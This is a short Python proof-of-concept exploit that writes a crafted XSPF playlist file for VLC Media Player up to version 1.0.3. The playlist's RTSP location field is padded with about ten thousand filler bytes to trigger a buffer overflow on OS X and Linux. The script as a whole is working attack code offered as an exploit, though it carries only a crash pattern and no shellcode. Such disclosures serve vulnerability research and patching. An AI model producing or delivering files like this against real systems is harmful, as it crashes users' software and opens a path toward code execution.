#!/usr/bin/env python

###########################################################################
#
# VLC Media Player <= 1.0.3 RTSP Buffer Overflow PoC (OSX/Linux)
# Found By:     Dr_IDE
# Tested On:    OSX 10.6.2                      (v1.0.3)
# Tested On:    Ubuntu 9 [2.6.28-15-generic]    (v0.9.9a)
# Tested On:    No Go on Windows
#
###########################################################################

header1  = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
header1 += ("<playlist version=\"1\" xmlns=\"http://xspf.org/ns/0/\" xmlns:vlc=\"http://www.videolan.org/vlc/playlist/ns/0/\">\n")
header1 += ("\t<title>Playlist</title>\n")
header1 += ("\t<trackList>\n")
header1 += ("\t\t<track>\n")
header1 += ("\t\t\t<location>rtsp://localhost@localhost/foo/#{")

payload  = ("\x41" * 2 + "\x42" * 4 + "\x43" * 10000)

header2  = ("}</location>\n");
header2 += ("\t\t\t<extension application=\"http://www.videolan.org/vlc/playlist/0\">\n");
header2 += ("\t\t\t\t<vlc:id>0</vlc:id>\n");
header2 += ("\t\t\t</extension>\n");
header2 += ("\t\t</track>\n");
header2 += ("\t</trackList>\n");
header2 += ("</playlist>\n");

try:
    f1 = open("vlc_1.0.X.xspf","w")
    f1.write(header1 + payload + header2)
    f1.close()
    print("\nExploit file created!\n")
except:
    print "Error"

#[pocoftheday.blogspot.com]